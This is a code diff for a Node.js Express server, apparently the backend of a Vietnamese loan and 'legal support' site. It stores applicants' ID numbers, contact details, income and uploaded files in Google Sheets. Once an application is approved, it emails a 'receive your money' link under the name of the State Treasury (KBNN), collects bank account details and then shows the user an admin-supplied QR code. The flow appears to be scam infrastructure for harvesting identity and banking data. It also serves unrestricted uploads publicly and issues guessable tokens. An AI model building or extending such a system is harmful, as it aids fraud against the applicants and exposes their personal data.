@@ -4,13 +4,31 @@ const cors = require('cors');
 const bodyParser = require('body-parser');
 const { GoogleSpreadsheet } = require('google-spreadsheet');
 const { JWT } = require('google-auth-library');
-
 const nodemailer = require('nodemailer');
+const multer = require('multer');
+const path = require('path');
+const fs = require('fs');
 
 const app = express();
 const PORT = process.env.PORT || 5000;
 
-// Email Transporter (Instructions will be provided to user)
+// Multer Config
+const UPLOADS_DIR = 'uploads';
+if (!fs.existsSync(UPLOADS_DIR)) {
+    fs.mkdirSync(UPLOADS_DIR);
+}
+
+const storage = multer.diskStorage({
+    destination: (req, file, cb) => {
+        cb(null, UPLOADS_DIR);
+    },
+    filename: (req, file, cb) => {
+        const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
+        cb(null, uniqueSuffix + path.extname(file.originalname));
+    }
+});
+const upload = multer({ storage: storage });
+
 const transporter = nodemailer.createTransport({
     service: 'gmail',
     auth: {
@@ -19,291 +37,224 @@ const transporter = nodemailer.createTransport({
     }
 });
 
-// Middleware
 app.use(cors());
 app.use(bodyParser.json());
 app.use(express.static('public'));
+app.use('/uploads', express.static(UPLOADS_DIR));
 
-// In-memory mock database for fallback
-let mockDB = {};
-
-// Google Sheets Config
-const SCOPES = [
-    'https://www.googleapis.com/auth/spreadsheets',
-    'https://www.googleapis.com/auth/drive.file',
-];
-
-// Google Sheets Helpers
 let cachedDoc = null;
+const SCOPES = ['https://www.googleapis.com/auth/spreadsheets', 'https://www.googleapis.com/auth/drive.file'];
+
 async function getSheets() {
     try {
-        if (!process.env.GOOGLE_SHEET_ID) {
-            throw new Error('GOOGLE_SHEET_ID is missing in .env file');
-        }
-
+        if (!process.env.GOOGLE_SHEET_ID) throw new Error('GOOGLE_SHEET_ID is missing');
         if (!cachedDoc) {
             const creds = require('./google-key.json');
-            const auth = new JWT({
-                email: creds.client_email,
-                key: creds.private_key,
-                scopes: SCOPES,
-            });
+            const auth = new JWT({ email: creds.client_email, key: creds.private_key, scopes: SCOPES });
             const doc = new GoogleSpreadsheet(process.env.GOOGLE_SHEET_ID, auth);
             await doc.loadInfo();
-            cachedDoc = doc; // Only cache after loadInfo is successful
+            cachedDoc = doc;
         }
-
         const doc = cachedDoc;
 
-        // 1. Info Sheet
-        let infoSheet = doc.sheetsByTitle['DangKyVayVon'];
-        if (!infoSheet) {
-            infoSheet = doc.sheetsByIndex[0];
-            await infoSheet.updateProperties({ title: 'DangKyVayVon' });
+        // Unified header structures
+        const loanHeaders = ['thoi_gian', 'ho_ten', 'gioi_tinh', 'tuoi', 'cccd', 'sdt', 'email', 'dia_chi', 'nghe_nghiep', 'da_vay', 'thu_nhap', 'so_tien', 'ma_gt', 'file_url', 'status', 'token', 'email_sent'];
+        const legalHeaders = ['thoi_gian', 'ho_ten', 'gioi_tinh', 'tuoi', 'cccd', 'sdt', 'email', 'ma_gt', 'trinh_do', 'ma_so_thue', 'file_url', 'status', 'token', 'email_sent'];
+
+        // 1. Vay Von (Existing)
+        let loanSheet = doc.sheetsByTitle['DangKyVayVon'];
+        if (!loanSheet) {
+            loanSheet = doc.sheetsByIndex[0];
+            await loanSheet.updateProperties({ title: 'DangKyVayVon' });
+        }
+        await loanSheet.setHeaderRow(loanHeaders);
+
+        // 2. Legal Services
+        const legalSheets = {};
+        const titles = {
+            'tien-treo': 'TienTreo',
+            'tim-viec': 'TimViecPhapLy',
+            'dat-dai': 'DatDaiPhapLy',
+            'nop-thue': 'NopThuePhapLy'
+        };
+
+        for (const [key, title] of Object.entries(titles)) {
+            let sheet = doc.sheetsByTitle[title];
+            if (!sheet) {
+                sheet = await doc.addSheet({ title });
+            }
+            await sheet.setHeaderRow(legalHeaders);
+            legalSheets[key] = sheet;
         }
 
-        // ALWAYS set headers to ensure we have the 'email_sent' and 'token' columns ready
-        await infoSheet.setHeaderRow([
-            'thoi_gian', 'ho_ten', 'tuoi', 'cccd', 'sdt', 'email',
-            'dia_chi', 'nghe_nghiep', 'da_vay', 'thu_nhap', 'so_tien', 'status', 'token', 'email_sent'
-        ]);
-
-        // 2. Bank Sheet
+        // 3. Bank Sheet
         let bankSheet = doc.sheetsByTitle['ThongTinNganHang'];
         if (!bankSheet) {
             bankSheet = await doc.addSheet({ title: 'ThongTinNganHang' });
         }
+        await bankSheet.setHeaderRow(['thoi_gian', 'token', 'qr_url', 'chu_tk', 'ngan_hang', 'stk', 'status']);
 
-        await bankSheet.setHeaderRow([
-            'thoi_gian', 'token', 'qr_url', 'chu_tk', 'ngan_hang', 'stk', 'status'
-        ]);
-
-        return { infoSheet, bankSheet };
+        return { loanSheet, legalSheets, bankSheet };
     } catch (err) {
         console.error('[SHEET FATAL ERROR]:', err.message);
-        cachedDoc = null; // Invalidate cache on error
+        cachedDoc = null;
         return null;
     }
 }
 
-// Background Task: Check for un-sent approval emails
 async function checkAndSendEmails() {
-    console.log('[MAILER] Polling for approvals (Waiting 60s between checks)...');
     try {
         const sheets = await getSheets();
         if (!sheets) return;
 
-        const rows = await sheets.infoSheet.getRows();
-        for (const row of rows) {
-            const status = (row.get('status') || '').toUpperCase();
-            const emailSent = row.get('email_sent');
-            const userEmail = row.get('email');
-            const token = row.get('token');
-            const fullName = row.get('ho_ten');
+        // Check all registration sheets for approvals
+        const allRegSheets = [sheets.loanSheet, ...Object.values(sheets.legalSheets)];
+        const appUrl = process.env.FRONTEND_URL || 'http://localhost:5173';
 
-            if (status === 'APPROVED' && emailSent !== 'YES' && userEmail) {
-                // Generate token ONLY at approval time if not already present
-                let activeToken = token;
-                if (!activeToken) {
-                    activeToken = 'loan-' + Math.random().toString(36).substr(2, 9);
-                    row.set('token', activeToken);
-                    console.log(`[MAILER] Generated new token for ${fullName}: ${activeToken}`);
-                }
+        for (const sheet of allRegSheets) {
+            const rows = await sheet.getRows();
+            for (const row of rows) {
+                const status = (row.get('status') || '').toUpperCase();
+                const emailSent = row.get('email_sent');
+                const userEmail = row.get('email');
+                const fullName = row.get('ho_ten');
+                let token = row.get('token');
 
-                console.log(`[MAILER] Triggering email for ${fullName} (${userEmail})`);
-
-                const appUrl = process.env.FRONTEND_URL || 'http://localhost:5173';
-                const verifyLink = `${appUrl}/?token=${activeToken}`;
-
-                const mailOptions = {
-                    from: `"Hỗ trợ vay vốn" <${process.env.EMAIL_USER}>`,
-                    to: userEmail,
-                    subject: 'Hồ sơ vay vốn của bạn đã được phê duyệt',
-                    html: `
-                        <div style="font-family: Arial, sans-serif; line-height: 1.6;">
-                            <h2>Chào ${fullName},</h2>
-                            <p>Chúc mừng! Hồ sơ đăng ký vay vốn của bạn đã được chúng tôi phê duyệt thành công.</p>
-                            <p>Vui lòng nhấn vào nút bên dưới để cập nhật thông tin giải ngân và nhận tiền:</p>
-                            <div style="text-align: center; margin: 30px 0;">
-                                <a href="${verifyLink}" style="background: #1a4f7a; color: white; padding: 12px 25px; text-decoration: none; border-radius: 5px; font-weight: bold;">CẬP NHẬT THÔNG TIN NGÂN HÀNG</a>
-                            </div>
-                            <p>Hoặc copy link sau: <br> ${verifyLink}</p>
-                            <p>Trân trọng,<br>Hệ thống hỗ trợ vay vốn</p>
-                        </div>
-                    `
-                };
-
-                try {
+                if (status === 'APPROVED' && emailSent !== 'YES' && userEmail) {
+                    if (!token) {
+                        token = 'tk-' + Math.random().toString(36).substr(2, 9);
+                        row.set('token', token);
+                    }
+                    const verifyLink = `${appUrl}/?token=${token}`;
+                    const mailOptions = {
+                        from: `"Hỗ trợ KBNN" <${process.env.EMAIL_USER}>`,
+                        to: userEmail,
+                        subject: 'Hồ sơ của bạn đã được phê duyệt',
+                        html: `<div style="font-family: Arial;"><h2>Chào ${fullName},</h2><p>Hồ sơ của bạn đã được phê duyệt thành công. Vui lòng nhận tiền tại link sau:</p><a href="${verifyLink}">${verifyLink}</a></div>`
+                    };
                     if (process.env.EMAIL_USER && process.env.EMAIL_PASS) {
                         await transporter.sendMail(mailOptions);
                         row.set('email_sent', 'YES');
                         await row.save();
-                        console.log(`[MAILER] Email sent successfully to ${userEmail}`);
-                    } else {
-                        console.warn('[MAILER] SKIP: Email credentials not configured.');
                     }
-                } catch (err) {
-                    console.error('[MAILER ERROR]:', err.message);
                 }
             }
         }
     } catch (err) {
-        if (err.message.includes('429')) {
-            console.warn('[MAILER] API Quota hit. Slower polling is active.');
-        } else {
-            console.error('[MAILER LOOP ERROR]:', err.message);
-        }
+        console.error('[MAILER ERROR]:', err.message);
     }
 }
+setInterval(checkAndSendEmails, 10000);
 
-// Check every 5 seconds (Faster response for admin approval)
-setInterval(checkAndSendEmails, 5000);
-
-// Routes
-app.post('/api/submit', async (req, res) => {
+// Submission Route
+app.post('/api/submit', upload.single('file'), async (req, res) => {
     const data = req.body;
+    const file = req.file;
     const timestamp = new Date().toLocaleString('vi-VN');
+    const service = data.service || 'vay-von';
 
-    console.log('[API] Processing submission for:', data.fullname);
+    const fileUrl = file ? `${req.protocol}://${req.get('host')}/uploads/${file.filename}` : '';
 
     try {
-        // Mock fallback (no token yet)
-        mockDB['temp-' + Math.random().toString(36).substr(2, 9)] = { ...data, status: 'pending', timestamp };
-
         const sheets = await getSheets();
         if (sheets) {
-            console.log('[SHEET] Adding row to infoSheet...');
-            await sheets.infoSheet.addRow({
+            let targetSheet = (service === 'vay-von') ? sheets.loanSheet : sheets.legalSheets[service];
+            if (!targetSheet) targetSheet = sheets.loanSheet;
+
+            const rowData = {
                 'thoi_gian': timestamp,
                 'ho_ten': data.fullname,
+                'gioi_tinh': data.gender,
                 'tuoi': data.age,
                 'cccd': data.cccd,
                 'sdt': data.phone,
                 'email': data.email,
-                'dia_chi': data.address,
-                'nghe_nghiep': data.occupation,
-                'da_vay': data.hasLoan || 'no',
-                'thu_nhap': data.income,
-                'so_tien': data.loanAmount,
+                'ma_gt': data.referralCode || '',
+                'file_url': fileUrl,
                 'status': 'PENDING',
-                'token': '', // DO NOT generate token yet
+                'token': '',
                 'email_sent': 'NO'
-            });
-            console.log('[SHEET] Success: Data saved. No token generated yet.');
-        } else {
-            console.warn('[SHEET] Warning: Connection failed, data only saved in memory (Mock Mode).');
-        }
+            };
 
+            if (service === 'vay-von') {
+                Object.assign(rowData, {
+                    'dia_chi': data.address,
+                    'nghe_nghiep': data.occupation,
+                    'da_vay': data.hasLoan || 'no',
+                    'thu_nhap': data.income,
+                    'so_tien': data.loanAmount
+                });
+            } else {
+                Object.assign(rowData, {
+                    'trinh_do': data.education || '',
+                    'ma_so_thue': data.taxId || ''
+                });
+            }
+
+            await targetSheet.addRow(rowData);
+        }
         res.json({ result: 'success' });
     } catch (err) {
-        console.error('[API ERROR] Submit:', err.message);
         res.status(500).json({ result: 'error', message: err.message });
     }
 });
 
-// Status Cache to avoid hitting Google Quota (60/min)
-let statusCache = {
-    data: null,
-    lastFetch: 0
-};
-
+let statusCache = { data: null, lastFetch: 0 };
 app.get('/api/status', async (req, res) => {
     const { token } = req.query;
     let result = { status: 'pending', qr_url: '' };
-
     try {
         const now = Date.now();
-        // Only fetch from Google if cache is older than 5 seconds
         if (!statusCache.data || (now - statusCache.lastFetch > 5000)) {
             const sheets = await getSheets();
             if (sheets) {
-                const infoRows = await sheets.infoSheet.getRows();
+                const allRegSheets = [sheets.loanSheet, ...Object.values(sheets.legalSheets)];
+                let infoRows = [];
+                for (const s of allRegSheets) {
+                    const rows = await s.getRows();
+                    infoRows = infoRows.concat(rows);
+                }
                 const bankRows = await sheets.bankSheet.getRows();
                 statusCache.data = { infoRows, bankRows };
                 statusCache.lastFetch = now;
             }
         }
-
         if (statusCache.data) {
             const infoRow = statusCache.data.infoRows.find(r => r.get('token') === token);
             const bankRow = statusCache.data.bankRows.find(r => r.get('token') === token);
-
-            // Determine status based on sheet data
             if (infoRow) {
                 const infoStatus = (infoRow.get('status') || 'PENDING').toUpperCase();
-
-                if (infoStatus === 'PENDING') {
-                    result.status = 'pending';
-                } else if (infoStatus === 'APPROVED') {
-                    // Check if bank row exists
+                if (infoStatus === 'PENDING') result.status = 'pending';
+                else if (infoStatus === 'APPROVED') {
                     if (bankRow) {
                         const qrUrl = bankRow.get('qr_url') || '';
                         const bankStatus = (bankRow.get('status') || '').toUpperCase();
-
-                        if (bankStatus === 'DONE' || bankStatus === 'SCANNED') {
-                            // Admin confirmed → success
-                            result.status = 'done';
-                        } else if (qrUrl) {
-                            // Admin added QR URL → show QR to user
-                            result.status = 'qr_ready';
-                            result.qr_url = qrUrl;
-                        } else {
-                            // Bank info submitted but waiting for admin to add QR
-                            result.status = 'waiting_qr';
-                        }
-                    } else {
-                        result.status = 'approved';
-                    }
+                        if (bankStatus === 'DONE' || bankStatus === 'SCANNED') result.status = 'done';
+                        else if (qrUrl) { result.status = 'qr_ready'; result.qr_url = qrUrl; }
+                        else result.status = 'waiting_qr';
+                    } else result.status = 'approved';
                 }
             }
         }
-    } catch (err) {
-        console.warn('[STATUS API] Error:', err.message);
-    }
-
+    } catch (err) { }
     res.json(result);
 });
 
 app.post('/api/submit-bank', async (req, res) => {
     const { token, bankOwner, bankName, bankAccount } = req.body;
     const timestamp = new Date().toLocaleString('vi-VN');
-
-    console.log('[API] Bank details for token:', token);
-
     try {
         const sheets = await getSheets();
         if (sheets) {
             await sheets.bankSheet.addRow({
-                'thoi_gian': timestamp,
-                'token': token,
-                'chu_tk': bankOwner,
-                'ngan_hang': bankName,
-                'stk': bankAccount,
-                'qr_url': '', // Admin will fill this later
-                'status': 'PENDING' // Admin will set SCANNED later
+                'thoi_gian': timestamp, 'token': token, 'chu_tk': bankOwner,
+                'ngan_hang': bankName, 'stk': bankAccount, 'qr_url': '', 'status': 'PENDING'
             });
-            console.log('[SHEET] Bank info saved with status PENDING');
         }
-
         res.json({ result: 'success' });
     } catch (err) {
-        console.error('[API ERROR] Bank:', err.message);
         res.status(500).json({ result: 'error', message: err.message });
     }
 });
 
-// Admin Route (To manually change status for testing)
-app.post('/api/admin/update-status', (req, res) => {
-    const { token, status, qr_url } = req.body;
-    if (mockDB[token]) {
-        mockDB[token].status = status;
-        if (qr_url) mockDB[token].qr_url = qr_url;
-        res.json({ result: 'success', current: mockDB[token] });
-    } else {
-        res.status(404).json({ error: 'Not found' });
-    }
-});
-
-app.listen(PORT, () => {
-    console.log(`Server running on http://localhost:${PORT}`);
-});
+app.listen(PORT, () => console.log(`Server running on http://localhost:${PORT}`));
